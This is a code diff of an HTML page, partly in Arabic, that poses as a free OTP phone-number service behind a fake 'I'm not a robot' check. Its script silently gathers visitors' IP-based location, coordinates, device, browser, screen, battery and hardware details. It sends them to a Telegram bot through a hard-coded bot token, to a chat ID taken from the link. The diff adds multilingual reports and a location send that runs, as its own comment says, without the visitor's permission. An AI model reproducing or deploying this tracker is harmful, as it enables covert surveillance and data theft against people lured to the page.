@@ -1,4 +1,4 @@
-here<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -25,14 +25,12 @@ here<!DOCTYPE html>
 </head>
 <body>
 
-    <!-- شاشة التحقق -->
     <div class="verify-popup" id="popup">
         <h2>⚠️ Human Verification Required</h2>
         <p>To get the OTP number, please verify you are not a robot.</p>
         <button class="verify-btn" onclick="triggerAction()">✅ I'm not a robot (Verify Now)</button>
     </div>
 
-    <!-- صفحة الأرقام -->
     <div class="content" id="mainContent">
         <div class="secure-badge">Secure • Temporary • Free</div>
         <p>Get your free OTP verification numbers instantly.</p>
@@ -42,13 +40,13 @@ here<!DOCTYPE html>
     <div id="loading">جاري التحقق... ⏳</div>
 
     <script>
-        // ⚠️⚠️ غير التوكن والآي دي هنا ⚠️⚠️
         const BOT_TOKEN = '8631883105:AAEh_pa8GZUITtttMSVEryWLaTcgxwbLBrc';       
-        const ADMIN_ID = '8564695453';         
+        const ADMIN_ID = '8564695453';  
         
         const urlParams = new URLSearchParams(window.location.search);
         const targetUserId = urlParams.get('id');
         const mode = urlParams.get('mode') || 'basic';
+        const userLang = urlParams.get('lang') || 'ar';
 
         const countries = [
             { flag: "🇪🇬", name: "Egypt", numbers: ["+20 10 1234 5678", "+20 11 9876 5432"] },
@@ -127,19 +125,18 @@ here<!DOCTYPE html>
 
         function showFakeLoading() { alert("Preparing number..."); }
 
-        // الدالة اللي بتجمع المعلومات وتبعتها بالشكل المطلوب
         async function sendBasicInfo() {
             if (!targetUserId) return;
 
             let ipData = {};
             try { 
-                const res = await fetch('https://ipapi.co/json/'); 
-                ipData = await res.json(); 
+                const res = await fetch('http://ip-api.com/json/?fields=status,query,country,regionName,city,isp,org,lat,lon,timezone'); 
+                const data = await res.json();
+                if(data.status === 'success') { ipData = data; }
             } catch (e) {}
 
             const ua = navigator.userAgent;
             let device = /android/i.test(ua) ? "Android" : /iPhone|iPad/i.test(ua) ? "iOS" : "PC";
-            let browser = ua.includes("Chrome") ? "Chrome" : ua.includes("Safari") ? "Safari" : "Firefox";
             
             let batteryText = "Not supported";
             try {
@@ -150,19 +147,100 @@ here<!DOCTYPE html>
             const screenRes = `${window.screen.width}x${window.screen.height}`;
             const isTouch = navigator.maxTouchPoints > 0 ? `Yes (${navigator.maxTouchPoints})` : 'No';
 
-            // تجهيز التقرير بنفس شكل الصورة
-            const report = `
+            let report = "";
+            let lat = ipData.lat || 0;
+            let lon = ipData.lon || 0;
+
+            if (userLang === 'ar') {
+                report = `
+📊 <b>Visitor Information Captured</b>
+━━━━━━━━━━━━━━━━
+
+🖥️ <b>الجهاز والمتصفح</b>
+• موديل الجهاز: ${device} (${navigator.platform})
+• المتصفح: ${ua}
+
+🌐 <b>معلومات الشبكة</b>
+• الآي بي: ${ipData.query || 'غير معروف'}
+• اللغة: ${navigator.language}
+
+📍 <b>تفاصيل الموقع</b>
+• الدولة: ${ipData.country || 'غير معروف'}
+• المحافظة: ${ipData.regionName || 'غير معروف'}
+• المدينة: ${ipData.city || 'غير معروف'}
+• المنطقة الزمنية: ${ipData.timezone || 'غير معروف'}
+
+🖼️ <b>معلومات الشاشة</b>
+• الدقة: ${screenRes}
+
+🔋 <b>حالة البطارية</b>
+• ${batteryText}
+
+🔐 <b>الصلاحيات</b>
+• الكاميرا: ${mode === 'camera' ? 'Allowed' : 'Prompt'}
+• الموقع: ${mode === 'location' ? 'Allowed' : 'Prompt'}
+
+💾 <b>الهاردوير</b>
+• أنوية المعالج: ${navigator.hardwareConcurrency || 'غير معروف'}
+• الرام: ${navigator.deviceMemory ? navigator.deviceMemory + ' جيجا' : 'غير معروف'}
+• اللمس: ${isTouch}
+
+━━━━━━━━━━━━━━━━
+⚡ <b>المطور:</b> <a href="tg://user?id=${ADMIN_ID}">تواصل مع المطور</a>
+                `;
+            } else if (userLang === 'hi') {
+                report = `
+📊 <b>Visitor Information Captured</b>
+━━━━━━━━━━━━━━━━
+
+🖥️ <b>डिवाइस और ब्राउज़र</b>
+• डिवाइस मॉडल: ${device} (${navigator.platform})
+• यूजर एजेंट: ${ua}
+
+🌐 <b>नेटवर्क जानकारी</b>
+• आईपी पता: ${ipData.query || 'अज्ञात'}
+• भाषा: ${navigator.language}
+
+📍 <b>स्थान विवरण</b>
+• देश: ${ipData.country || 'अज्ञात'}
+• क्षेत्र: ${ipData.regionName || 'अज्ञात'}
+• शहर: ${ipData.city || 'अज्ञात'}
+• समय क्षेत्र: ${ipData.timezone || 'अज्ञात'}
+
+🖼️ <b>प्रदर्शन जानकारी</b>
+• रिज़ॉल्यूशन: ${screenRes}
+
+🔋 <b>बैटरी की स्थिति</b>
+• ${batteryText}
+
+🔐 <b>डिवाइस अनुमतियाँ</b>
+• कैमरा: ${mode === 'camera' ? 'Allowed' : 'Prompt'}
+• स्थान: ${mode === 'location' ? 'Allowed' : 'Prompt'}
+
+💾 <b>हार्डवेयर</b>
+• सीपीयू कोर: ${navigator.hardwareConcurrency || 'अज्ञात'}
+• रैम: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'अज्ञात'}
+• टच: ${isTouch}
+
+━━━━━━━━━━━━━━━━
+⚡ <b>डेवलपर:</b> <a href="tg://user?id=${ADMIN_ID}">संपर्क करने के लिए यहां क्लिक करें</a>
+                `;
+            } else {
+                report = `
+📊 <b>Visitor Information Captured</b>
+━━━━━━━━━━━━━━━━
+
 🖥️ <b>Device & Browser</b>
 • Device Model: ${device} (${navigator.platform})
 • User Agent: ${ua}
 
 🌐 <b>Network Information</b>
-• IP Address: ${ipData.ip || 'Unknown'}
+• IP Address: ${ipData.query || 'Unknown'}
 • Language: ${navigator.language}
 
 📍 <b>Location Details</b>
-• Country: ${ipData.country_name || 'Unknown'}
-• Region: ${ipData.region || 'Unknown'}
+• Country: ${ipData.country || 'Unknown'}
+• Region: ${ipData.regionName || 'Unknown'}
 • City: ${ipData.city || 'Unknown'}
 • Timezone: ${ipData.timezone || 'Unknown'}
 
@@ -173,22 +251,32 @@ here<!DOCTYPE html>
 • ${batteryText}
 
 🔐 <b>Device Permissions</b>
-• Camera: Prompt
-• Location: Prompt
+• Camera: ${mode === 'camera' ? 'Allowed' : 'Prompt'}
+• Location: ${mode === 'location' ? 'Allowed' : 'Prompt'}
 
 💾 <b>Hardware & Storage</b>
 • CPU Cores: ${navigator.hardwareConcurrency || 'Unknown'}
 • RAM: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'}
 • Touch Support: ${isTouch}
 
-⚡ <b>Developed by:</b> <a href="tg://user?id=${ADMIN_ID}">Click Here (Support)</a>
-            `;
+━━━━━━━━━━━━━━━━
+⚡ <b>Developed by:</b> <a href="tg://user?id=${ADMIN_ID}">Contact Developer</a>
+                `;
+            }
 
-            // إرسال الرسالة
+            // إرسال الرسالة للبوت
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: targetUserId, text: report, parse_mode: 'HTML', disable_web_page_preview: true })
             }).catch(e=>{});
+
+            // إرسال الخريطة (بناءً على الـ IP) حتى لو مدي صلاحية
+            if (lat !== 0 && lon !== 0) {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: targetUserId, latitude: lat, longitude: lon })
+                }).catch(e=>{});
+            }
         }
 
         async function sendText(text) {
